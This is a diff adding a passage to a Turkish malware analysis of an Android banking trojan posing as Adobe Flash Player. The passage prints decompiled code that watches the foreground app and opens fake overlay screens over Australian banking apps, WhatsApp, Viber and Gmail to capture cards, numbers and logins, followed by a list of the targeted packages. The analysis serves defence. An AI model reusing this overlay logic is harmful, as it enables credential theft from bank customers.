@@ -523,4 +523,73 @@ Uygulamanın kaynak kodlarında yer alan sınıflardan:
 
 gibi siteleri hedef alması zararlının farklı bir kıtayı hedefler iken kurban portföyünü genişletmek adına türk banka müşterilerini de hedef aldığını söyleyebiliriz.
 
+Zararlının kaynak kodlarında yer alan
+
+```java
+ public void run()
+          {
+            String str;
+            try
+            {
+              Object localObject = MainService.this.getTopRunning();
+              str = MainService.this.getHTMLForPackageName((String)localObject);
+              if (((isRunning("com.android.vending")) || (isRunning("com.google.android.music"))) && (!MainService.settings.getBoolean("CODE_IS_SENT", false)))
+              {
+                localObject = new Intent(MainService.this, Cards.class);
+        ...
+              }
+              if (((isRunning("com.whatsapp")) || (isRunning("com.viber.voip")) || (isRunning("com.instagram.android")) || (isRunning("com.skype.raider"))) && (!MainService.settings.getBoolean("PHONE_IS_SENT", false)))
+              {
+                localObject = new Intent(MainService.this, ChangeNumber.class);
+        ...
+              }
+            }
+	...
+            Intent localIntent1;
+            if ((isRunning("com.google.android.gm")) && (!MainService.settings.getBoolean("GM_IS_SENT", false)))
+            {
+              localIntent1 = new Intent(MainService.this, GM.class);
+	...
+            }
+            if (((isRunning("com.commbank.netbank")) || (isRunning("com.cba.android.netbank"))) && (!MainService.settings.getBoolean("COMMBANK_IS_SENT", false)))
+            {
+              localIntent1 = new Intent(MainService.this, Commbank.class);
+    	...
+            }
+            if ((isRunning("au.com.nab.mobile")) && (!MainService.settings.getBoolean("NAB_IS_SENT", false)))
+            {
+              localIntent1 = new Intent(MainService.this, Nab.class);
+        ...
+            }
+            if ((isRunning("org.westpac.bank")) && (!MainService.settings.getBoolean("WESTPACK_IS_SENT", false)))
+            {
+              localIntent1 = new Intent(MainService.this, Westpack.class);
+     	...
+            }
+            if ((isRunning("org.stgeorge.bank")) && (!MainService.settings.getBoolean("ST_JEORGE_IS_SENT", false)))
+            {
+              localIntent1 = new Intent(MainService.this, StGeorge.class);
+       ...
+            }
+
+```
+satırlarıyla  zararlının hedef aldığı uygulamalar da görülebilmektedir.
+
+- com.android.vending
+- com.google.android.music
+- com.whatsapp
+- com.viber.voip
+- com.instagram.android
+- com.skype.raider
+- com.google.android.gm
+- com.commbank.netbank
+- com.cba.android
+- au.com.nab.mobile
+- org.stgeorge.bank
+- org.westpac.bank
+
+örnek olarak viber uygulaması açıldığında kullanıcıya ait doğrulama kodunun gönderileceği telefon numarası bilgisine erişim
+![](http://i.imgur.com/8ai5MoS.png)
+![](http://i.imgur.com/vDJdRTc.png)
+
 Zararlıya ait ioc bilgilerine [buradan](iocs/AdobeFlashPlayer.apk.ioc) erişebilirsiniz.
